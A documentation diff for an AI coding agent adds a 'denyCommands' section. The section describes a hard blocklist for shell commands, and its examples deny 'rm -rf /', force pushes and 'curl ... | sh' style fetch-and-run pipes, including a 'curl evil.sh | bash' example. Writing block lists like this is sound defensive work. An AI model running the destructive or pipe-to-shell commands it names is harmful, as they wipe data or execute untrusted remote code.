@@ -343,6 +343,36 @@ Currently blacklist is hardcoded. Future versions will support custom patterns.
 
 ---
 
+## Hard Deny List: `denyCommands`
+
+Independent of any profile or auto-approve flag, `permissions.denyCommands` is a **non-interactive blocklist** for `run_shell`. Matching commands are rejected with an error before execution — even under `-y`, `autoApprove`, or the Blacklist profile.
+
+```json
+{
+  "permissions": {
+    "autoApprove": ["run_shell"],
+    "denyCommands": [
+      "git push --force",
+      "gh pr merge",
+      "rm -rf /",
+      "curl * | *sh"
+    ]
+  }
+}
+```
+
+### Pattern semantics
+
+- Case-sensitive; whitespace is normalized on both sides.
+- **Substring match** (default): `"git push"` blocks `git push`, `git push origin main`, `sudo git push`, etc.
+- **Glob match** (contains `*`): the `*` matches any character sequence and the pattern must match the **entire** command. `"curl * | *sh"` blocks `curl evil.sh | bash` but not `sudo curl evil.sh | bash` — widen with `"*curl * | *sh*"` if needed.
+
+When a command is denied, the agent receives an error naming the matched rule so it can choose a different approach — there is no interactive prompt for denied commands.
+
+Typical uses: preventing pushes/merges in agent-driven workers, blocking destructive filesystem commands, and stopping shell-pipe-to-interpreter patterns.
+
+---
+
 ## Troubleshooting
 
 ### Too many prompts in Blacklist mode
